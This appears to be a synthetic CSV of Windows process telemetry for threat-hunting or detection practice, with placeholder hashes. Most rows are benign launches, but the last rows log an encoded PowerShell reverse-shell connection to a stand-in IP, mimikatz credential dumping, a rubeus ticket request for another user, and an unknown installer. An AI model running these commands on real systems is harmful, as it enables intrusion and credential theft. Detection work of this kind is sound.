TimeGenerated,Timestamp,DeviceName,DeviceId,AccountName,AccountDomain,FileName,FolderPath,ProcessCommandLine,ProcessId,SHA256,SHA1,MD5,FileSize,InitiatingProcessFileName,InitiatingProcessFolderPath,InitiatingProcessCommandLine,InitiatingProcessId,InitiatingProcessAccountName,InitiatingProcessSHA256,InitiatingProcessSignatureStatus,InitiatingProcessSignerType,ProcessIntegrityLevel,ProcessTokenElevation,Type
2026-04-28T14:43:20Z,2026-04-28T14:43:20Z,WS-FINANCE-01,dev-ws-finance-01,jadams,CORP,cmd.exe,C:\Windows\System32,cmd.exe,9359,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,4995117,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5457,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T09:32:54Z,2026-04-29T09:32:54Z,WS-DEV-02,dev-ws-dev-02,dchen,CORP,notepad.exe,C:\Windows\System32,notepad.exe,8917,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,0000000000000000000000000647fda2043cb34d,00000000000000007474b5476f8356fb,1693294,explorer.exe,C:\Windows,C:\Windows\explorer.exe,2564,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T11:13:48Z,2026-04-28T11:13:48Z,WS-HR-03,dev-ws-hr-03,dchen,CORP,cmd.exe,C:\Windows\System32,cmd.exe,4849,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,85118,explorer.exe,C:\Windows,C:\Windows\explorer.exe,1734,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T02:50:32Z,2026-04-29T02:50:32Z,WS-HR-03,dev-ws-hr-03,dchen,CORP,cmd.exe,C:\Windows\System32,cmd.exe,7700,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,1060963,explorer.exe,C:\Windows,C:\Windows\explorer.exe,1388,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T14:18:54Z,2026-04-28T14:18:54Z,WS-FINANCE-01,dev-ws-finance-01,jadams,CORP,explorer.exe,C:\Windows\System32,explorer.exe,6127,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,0000000000000000000000004747f7b75a1482c3,0000000000000000594d0396e9eff80c,3462197,explorer.exe,C:\Windows,C:\Windows\explorer.exe,7248,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T08:25:27Z,2026-04-29T08:25:27Z,WS-FINANCE-01,dev-ws-finance-01,mholmes,CORP,cmd.exe,C:\Windows\System32,cmd.exe,1213,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,4946026,explorer.exe,C:\Windows,C:\Windows\explorer.exe,9848,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T14:32:00Z,2026-04-28T14:32:00Z,WS-DEV-02,dev-ws-dev-02,dchen,CORP,chrome.exe,C:\Windows\System32,chrome.exe,9485,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,817715,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5999,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T16:15:42Z,2026-04-28T16:15:42Z,WS-FINANCE-01,dev-ws-finance-01,dchen,CORP,chrome.exe,C:\Windows\System32,chrome.exe,6330,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,1192811,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5232,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T10:22:03Z,2026-04-29T10:22:03Z,WS-HR-03,dev-ws-hr-03,jadams,CORP,explorer.exe,C:\Windows\System32,explorer.exe,8331,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,0000000000000000000000004747f7b75a1482c3,0000000000000000594d0396e9eff80c,3068388,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8522,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T01:16:49Z,2026-04-29T01:16:49Z,WS-FINANCE-01,dev-ws-finance-01,bryce,CORP,powershell.exe,C:\Windows\System32,powershell.exe,3379,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,4097614,explorer.exe,C:\Windows,C:\Windows\explorer.exe,2651,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T15:08:36Z,2026-04-28T15:08:36Z,WS-FINANCE-01,dev-ws-finance-01,bryce,CORP,powershell.exe,C:\Windows\System32,powershell.exe,3027,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,1477676,explorer.exe,C:\Windows,C:\Windows\explorer.exe,3661,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T08:18:25Z,2026-04-29T08:18:25Z,WS-DEV-02,dev-ws-dev-02,jadams,CORP,cmd.exe,C:\Windows\System32,cmd.exe,6485,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,1852572,explorer.exe,C:\Windows,C:\Windows\explorer.exe,6167,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T00:17:39Z,2026-04-29T00:17:39Z,WS-DEV-02,dev-ws-dev-02,jadams,CORP,chrome.exe,C:\Windows\System32,chrome.exe,3182,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,1102724,explorer.exe,C:\Windows,C:\Windows\explorer.exe,4172,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T16:56:36Z,2026-04-28T16:56:36Z,WS-HR-03,dev-ws-hr-03,bryce,CORP,notepad.exe,C:\Windows\System32,notepad.exe,1803,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,0000000000000000000000000647fda2043cb34d,00000000000000007474b5476f8356fb,2560580,explorer.exe,C:\Windows,C:\Windows\explorer.exe,7082,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T05:49:12Z,2026-04-29T05:49:12Z,WS-FINANCE-01,dev-ws-finance-01,bryce,CORP,powershell.exe,C:\Windows\System32,powershell.exe,5460,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,2944748,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5110,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T09:58:24Z,2026-04-28T09:58:24Z,WS-HR-03,dev-ws-hr-03,bryce,CORP,cmd.exe,C:\Windows\System32,cmd.exe,6343,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,4763488,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5539,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T18:00:25Z,2026-04-28T18:00:25Z,WS-FINANCE-01,dev-ws-finance-01,jadams,CORP,powershell.exe,C:\Windows\System32,powershell.exe,9345,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,2650867,explorer.exe,C:\Windows,C:\Windows\explorer.exe,1267,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T03:39:36Z,2026-04-29T03:39:36Z,WS-DEV-02,dev-ws-dev-02,bryce,CORP,powershell.exe,C:\Windows\System32,powershell.exe,6278,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,2226802,explorer.exe,C:\Windows,C:\Windows\explorer.exe,2268,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T20:55:26Z,2026-04-28T20:55:26Z,WS-DEV-02,dev-ws-dev-02,mholmes,CORP,powershell.exe,C:\Windows\System32,powershell.exe,6073,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,3988309,explorer.exe,C:\Windows,C:\Windows\explorer.exe,1561,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T21:44:53Z,2026-04-28T21:44:53Z,WS-DEV-02,dev-ws-dev-02,bryce,CORP,chrome.exe,C:\Windows\System32,chrome.exe,9675,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,4669447,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5223,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T04:31:36Z,2026-04-29T04:31:36Z,WS-FINANCE-01,dev-ws-finance-01,dchen,CORP,cmd.exe,C:\Windows\System32,cmd.exe,8622,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,3044317,explorer.exe,C:\Windows,C:\Windows\explorer.exe,4785,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T23:53:19Z,2026-04-28T23:53:19Z,WS-DEV-02,dev-ws-dev-02,dchen,CORP,cmd.exe,C:\Windows\System32,cmd.exe,2178,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,4586274,explorer.exe,C:\Windows,C:\Windows\explorer.exe,5280,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T05:24:54Z,2026-04-29T05:24:54Z,WS-FINANCE-01,dev-ws-finance-01,bryce,CORP,notepad.exe,C:\Windows\System32,notepad.exe,2874,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,0000000000000000000000000647fda2043cb34d,00000000000000007474b5476f8356fb,4534345,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8376,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T09:16:36Z,2026-04-29T09:16:36Z,WS-DEV-02,dev-ws-dev-02,mholmes,CORP,chrome.exe,C:\Windows\System32,chrome.exe,7785,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,3761277,explorer.exe,C:\Windows,C:\Windows\explorer.exe,3287,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T22:37:46Z,2026-04-28T22:37:46Z,WS-HR-03,dev-ws-hr-03,jadams,CORP,explorer.exe,C:\Windows\System32,explorer.exe,4708,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,0000000000000000000000004747f7b75a1482c3,0000000000000000594d0396e9eff80c,1321125,explorer.exe,C:\Windows,C:\Windows\explorer.exe,4876,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T20:42:40Z,2026-04-28T20:42:40Z,WS-DEV-02,dev-ws-dev-02,dchen,CORP,cmd.exe,C:\Windows\System32,cmd.exe,4664,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,2846821,explorer.exe,C:\Windows,C:\Windows\explorer.exe,3422,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T07:40:23Z,2026-04-29T07:40:23Z,WS-HR-03,dev-ws-hr-03,jadams,CORP,chrome.exe,C:\Windows\System32,chrome.exe,5569,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,1975119,explorer.exe,C:\Windows,C:\Windows\explorer.exe,4087,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T10:38:54Z,2026-04-28T10:38:54Z,WS-FINANCE-01,dev-ws-finance-01,jadams,CORP,cmd.exe,C:\Windows\System32,cmd.exe,6801,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,1582410,explorer.exe,C:\Windows,C:\Windows\explorer.exe,7107,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T09:54:26Z,2026-04-29T09:54:26Z,WS-DEV-02,dev-ws-dev-02,dchen,CORP,chrome.exe,C:\Windows\System32,chrome.exe,2614,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,947070,explorer.exe,C:\Windows,C:\Windows\explorer.exe,1026,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T22:41:52Z,2026-04-28T22:41:52Z,WS-DEV-02,dev-ws-dev-02,mholmes,CORP,cmd.exe,C:\Windows\System32,cmd.exe,6412,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,442737,explorer.exe,C:\Windows,C:\Windows\explorer.exe,3114,mholmes,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T06:11:53Z,2026-04-29T06:11:53Z,WS-FINANCE-01,dev-ws-finance-01,jadams,CORP,chrome.exe,C:\Windows\System32,chrome.exe,2876,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,1244193,explorer.exe,C:\Windows,C:\Windows\explorer.exe,6233,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T09:28:38Z,2026-04-29T09:28:38Z,WS-FINANCE-01,dev-ws-finance-01,jadams,CORP,powershell.exe,C:\Windows\System32,powershell.exe,5277,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,1685570,explorer.exe,C:\Windows,C:\Windows\explorer.exe,6542,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T05:16:49Z,2026-04-29T05:16:49Z,WS-HR-03,dev-ws-hr-03,bryce,CORP,powershell.exe,C:\Windows\System32,powershell.exe,3104,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,000000000000000000000000730ea284d8ff6251,00000000000000007a74acd822b59a02,4989663,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8551,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T20:30:26Z,2026-04-28T20:30:26Z,WS-DEV-02,dev-ws-dev-02,jadams,CORP,notepad.exe,C:\Windows\System32,notepad.exe,8679,aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,0000000000000000000000000647fda2043cb34d,00000000000000007474b5476f8356fb,787417,explorer.exe,C:\Windows,C:\Windows\explorer.exe,7508,jadams,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T15:35:07Z,2026-04-28T15:35:07Z,WS-FINANCE-01,dev-ws-finance-01,bryce,CORP,chrome.exe,C:\Windows\System32,chrome.exe,6018,bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb,00000000000000000000000051746a4e6ea38203,000000000000000036587526ea77394a,4095894,explorer.exe,C:\Windows,C:\Windows\explorer.exe,9605,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-28T19:02:05Z,2026-04-28T19:02:05Z,WS-FINANCE-01,dev-ws-finance-01,bryce,CORP,explorer.exe,C:\Windows\System32,explorer.exe,3169,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,0000000000000000000000004747f7b75a1482c3,0000000000000000594d0396e9eff80c,3801328,explorer.exe,C:\Windows,C:\Windows\explorer.exe,8712,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T04:33:44Z,2026-04-29T04:33:44Z,WS-HR-03,dev-ws-hr-03,bryce,CORP,explorer.exe,C:\Windows\System32,explorer.exe,8051,eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee,0000000000000000000000004747f7b75a1482c3,0000000000000000594d0396e9eff80c,3141469,explorer.exe,C:\Windows,C:\Windows\explorer.exe,6749,bryce,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T02:17:37Z,2026-04-29T02:17:37Z,WS-HR-03,dev-ws-hr-03,dchen,CORP,cmd.exe,C:\Windows\System32,cmd.exe,9386,cccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccccc,00000000000000000000000034ed97e75a3ae59e,00000000000000002fbd2ae57c7a64f2,2841876,explorer.exe,C:\Windows,C:\Windows\explorer.exe,1548,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T13:30:00Z,2026-04-29T13:30:00Z,WS-DEV-02,dev-ws-dev-02,dchen,CORP,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,2038,dddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddd,0000000000000000000000006c8a50b6c4684d91,000000000000000026eb74a63e94226b,3310330,explorer.exe,C:\Windows,C:\Windows\explorer.exe,2670,dchen,0000000000000000000000000000000000000000000000000acb7d2b05652e37,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T13:32:00Z,2026-04-29T13:32:00Z,WS-DEV-02,dev-ws-dev-02,dchen,CORP,mimikatz.exe,C:\Users\dchen\AppData\Local\Temp,C:\Users\dchen\AppData\Local\Temp\mimikatz.exe privilege::debug sekurlsa::logonpasswords,7020,ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff,0000000000000000000000001caae8b28817b30d,000000000000000016425cf93c0985fd,149601,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,8918,dchen,0000000000000000000000000000000000000000000000005c9dfb7fcc731db8,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T13:32:00Z,2026-04-29T13:32:00Z,WS-DEV-02,dev-ws-dev-02,dchen,CORP,rubeus.exe,C:\Users\dchen\AppData\Local\Temp,C:\Users\dchen\AppData\Local\Temp\rubeus.exe asktgt /user:bryce /domain:CORP,3552,9999999999999999999999999999999999999999999999999999999999999999,000000000000000000000000283c8121ff42cae2,000000000000000047994d2be8cc466b,1669367,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0,powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADgALgA1ADEALgAxADAAMAAuADUANQAiACwANAA0ADMAKQA=,1883,dchen,0000000000000000000000000000000000000000000000005c9dfb7fcc731db8,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
2026-04-29T13:59:00Z,2026-04-29T13:59:00Z,WS-DEV-02,dev-ws-dev-02,dchen,CORP,totally_new_binary.exe,C:\Users\dchen\Downloads,C:\Users\dchen\Downloads\totally_new_binary.exe --install,7205,1111111111111111111111111111111111111111111111111111111111111111,0000000000000000000000005ee90b5e161f37cf,00000000000000006d9dd443969b47f8,313764,chrome.exe,C:\Program Files\Google\Chrome\Application,chrome.exe,2624,dchen,0000000000000000000000000000000000000000000000001e6d56af234b562b,Valid,Microsoft,Medium,TokenElevationTypeDefault,DeviceProcessEvents
